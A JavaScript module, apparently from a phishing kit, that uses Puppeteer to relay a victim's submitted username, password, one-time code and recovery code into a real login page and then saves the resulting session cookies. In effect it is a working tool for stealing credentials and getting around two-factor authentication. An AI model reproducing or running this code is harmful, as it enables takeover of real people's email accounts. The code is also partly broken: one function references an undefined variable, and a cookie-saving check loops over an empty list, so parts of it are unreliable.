const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let username = "#username"
                await page.waitForSelector(username)
                await page.evaluate((username) => {
                    const usernameInput = document.querySelector(username)
                    usernameInput.select()
                    document.execCommand('cut')
                    passwordInput.select()
                    document.execCommand('cut')
                }, username)
                await page.type(username, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = []

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                let username = "#username"
                let password = "#password"
                await page.waitForSelector(username)
                await page.waitForSelector(password)
                await page.evaluate((username, password) => {
                    const usernameInput = document.querySelector(username)
                    const passwordInput = document.querySelector(password)

                    usernameInput.select()
                    document.execCommand('cut')
                    passwordInput.select()
                    document.execCommand('cut')
                }, username, password)
                await page.type(username, body.username)
                await page.type(password, body.password)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 4000))
                        return true
                    }
                })

                const html = await page.content()
                if (this.innerHTMLMatcher(html, "To fight spam and abuse, please verify you are human.", "Human Verification")) {
                    await new Promise(re => setTimeout(re, 11000))
                }
            } else if (spikeType == "otp-code") {
                await page.evaluate(() => {
                    let allInputs = document.querySelectorAll(`[type="tel"]`)

                    allInputs.forEach((v, i) => {
                        v.setAttribute("spike-otp-box", i)
                    })
                })

                for (let i = 0; i < 6; i++) {
                    const cInput = `[spike-otp-box="${i}"]`
                    await page.waitForSelector(cInput)
                    await page.type(cInput, body.code[i])
                }

                await page.click(`[type="submit"]`)

                let checkOtp = false
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        const data = await response.json()
                        if (!data.hasOwnProperty("Error")) {
                            checkOtp = true
                        }
                    }
                    return true
                })

                if (checkOtp) return await this.saveCookies()
            } else if (spikeType == "use-authcode-btn") {
                const useRCodebtn = `#spike-r-code-btn`

                await page.waitForSelector(useRCodebtn)
                await page.click(useRCodebtn)
            } else if (spikeType == "recovery-code") {
                const reCodeInput = `#recovery-code`

                await page.waitForSelector(reCodeInput)

                await page.evaluate((reCodeInput) => {
                    const a = document.querySelector(reCodeInput)

                    a.select()
                    document.execCommand('cut')
                }, reCodeInput)

                await page.type(reCodeInput, body.code)
                await page.click(`[type="submit"]`)
                let checkOtp = false
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        const data = await response.json()
                        if (!data.hasOwnProperty("Error")) {
                            checkOtp = true
                        }
                    }
                    return true
                })

                if (checkOtp) return await this.saveCookies()
            } else if (spikeType == "use-recovery-btn") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.innerText == "Use recovery code") {
                            btn.id = `spike-r-code-btn`
                            btn.click()
                        }
                    })
                })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }